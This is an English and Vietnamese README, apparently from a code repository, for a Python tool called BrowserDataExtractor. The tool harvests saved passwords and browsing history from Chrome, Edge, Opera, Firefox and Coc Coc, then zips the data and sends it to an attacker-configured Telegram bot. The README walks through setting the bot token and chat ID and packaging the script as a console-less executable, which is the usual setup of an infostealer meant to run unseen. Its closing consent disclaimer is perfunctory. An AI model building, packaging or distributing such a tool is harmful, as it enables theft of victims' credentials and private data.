

EN
---
I came back and worked continued

### Guide for Using BrowserDataExtractor.py

Note that this code only works to retrieve passwords that you have saved in your preferred browser, so it will only access those saved passwords.

Get Bot channel ID
```https://api.telegram.org/bot<BOT_TOKEN>/getUpdates```

**`Browser Data Extractor`** is a powerful tool for collecting data from popular web browsers. It can retrieve information about passwords and browsing history from multiple browsers and send the results as a zip file via Telegram.

#### **Key Features:**
- Collects passwords and browsing history from browsers such as Google Chrome, Coc Coc, Microsoft Edge, Opera, Firefox And other things.
- Saves data to text files in a structured directory format.
- Creates a zip file containing all the data and sends it via Telegram.

#### **Requirements:**
- Python 3.x
- Python libraries: `requests`, `pywin32`, `pycryptodome`, `sqlite3`, `shutil`
- Internet connection for sending data via Telegram.

#### **Installation Instructions:**

1. **Install the necessary libraries:**
   ```bash
   pip install requests psutil pycountry screeninfo pycryptodome winshell pypiwin32
   ```

2. **Save the source code to a file named `BrowserDataExtractor.py`.**

3. **Configure the Telegram bot:**
   - Replace `bot_token` and `chat_id` with your Telegram bot's token and chat ID in the source code.

4. **Create an executable file:**
   - Convert the script to a standalone executable using PyInstaller with the `--onefile` and `--noconsole` options:
     ```bash
     pyinstaller --onefile --noconsole --icon=NONE BrowserDataExtractor.py
     ```
   - The executable file will be created in the `dist` folder.

#### **Usage Instructions:**

1. **Run the executable file:**
   - Execute the generated file to start the data collection process. The script will check for an internet connection and then collect data from the browsers.
   - If there is no internet connection, the program will stop and will not attempt to send data.

2. **Results:**
   - The collected data will be saved in the `Passwords` and `History` folders as text files.
   - These files will be compressed into a zip file and sent via Telegram to the specified chat ID.

#### **Notes:**
- Ensure that the script has access to the necessary files and directories on the system.
- Use this script only for legitimate purposes and with the consent of users.

If you encounter any issues or have questions, please contact me or check the official documentation for the libraries used in the script.

![Tester và User](https://i0.wp.com/comedymajors.com/wp-content/uploads/2024/02/tester-and-user.jpg?resize=704%2C1024&ssl=1)

---

VI
---
Tôi đã trở lại và làm việc tiếp tục

### Hướng Dẫn Sử Dụng Browser Data Extractor

Lưu ý rằng mã này chỉ hoạt động để truy xuất mật khẩu mà bạn đã lưu trong trình duyệt ưa thích của mình, vì vậy nó sẽ chỉ truy cập vào các mật khẩu đã lưu đó.

lấy ID kênh bot
```https://api.telegram.org/bot<BOT_TOKEN>/getUpdates```

**`BrowserDataExtractor.py`** là một công cụ mạnh mẽ để thu thập dữ liệu từ các trình duyệt web phổ biến. Nó có khả năng lấy thông tin về mật khẩu, lịch sử duyệt web từ nhiều trình duyệt khác nhau và gửi kết quả dưới dạng tệp zip qua Telegram.

#### **Các Tính Năng Chính:**
- Thu thập mật khẩu và lịch sử duyệt web từ các trình duyệt như Google Chrome, Coc Coc, Microsoft Edge, Opera, Firefox Và những thứ khác.
- Lưu trữ dữ liệu vào các tệp văn bản theo cấu trúc thư mục.
- Tạo tệp zip chứa tất cả dữ liệu và gửi qua Telegram.

#### **Yêu Cầu:**
- Python 3.x
- Thư viện Python: `requests`, `pywin32`, `pycryptodome`, `sqlite3`, `shutil`
- Kết nối internet để gửi dữ liệu qua Telegram.

#### **Hướng Dẫn Cài Đặt:**

1. **Cài đặt các thư viện cần thiết:**
   ```bash
   pip install requests psutil pycountry screeninfo pycryptodome winshell pypiwin32
   ```

2. **Lưu mã nguồn vào tệp `BrowserDataExtractor.py`.**

3. **Cấu hình bot Telegram:**
   - Thay thế `bot_token` và `chat_id` bằng thông tin của bot Telegram của bạn trong mã nguồn.

4. **Tạo tệp thực thi:**
   - Để chuyển đổi script thành một tệp thực thi độc lập, sử dụng PyInstaller với các tùy chọn `--onefile` và `--noconsole`:
     ```bash
     pyinstaller --onefile --noconsole --icon=NONE BrowserDataExtractor.py
     ```
   - Tệp thực thi sẽ được tạo trong thư mục `dist`.

#### **Cách Sử Dụng:**

1. **Chạy tệp thực thi:**
   - Chạy tệp thực thi đã tạo để bắt đầu quá trình thu thập dữ liệu. Tệp sẽ kiểm tra kết nối mạng và sau đó thu thập dữ liệu từ các trình duyệt.
   - Nếu không có kết nối mạng, chương trình sẽ dừng lại và không tiếp tục gửi dữ liệu.

2. **Kết quả:**
   - Dữ liệu thu thập được sẽ được lưu trong các thư mục `Passwords` và `History` dưới dạng các tệp văn bản.
   - Các tệp này sẽ được nén thành một tệp zip và gửi qua Telegram đến ID trò chuyện đã chỉ định.

#### **Lưu Ý:**
- Đảm bảo rằng script có quyền truy cập vào các tệp và thư mục cần thiết trên hệ thống.
- Sử dụng script này chỉ cho các mục đích hợp pháp và với sự cho phép của người dùng.

Nếu bạn gặp bất kỳ vấn đề nào hoặc có câu hỏi, hãy liên hệ với tôi hoặc kiểm tra tài liệu chính thức của các thư viện sử dụng trong script.

![Tester và User](https://i0.wp.com/comedymajors.com/wp-content/uploads/2024/02/tester-and-user.jpg?resize=704%2C1024&ssl=1)

---

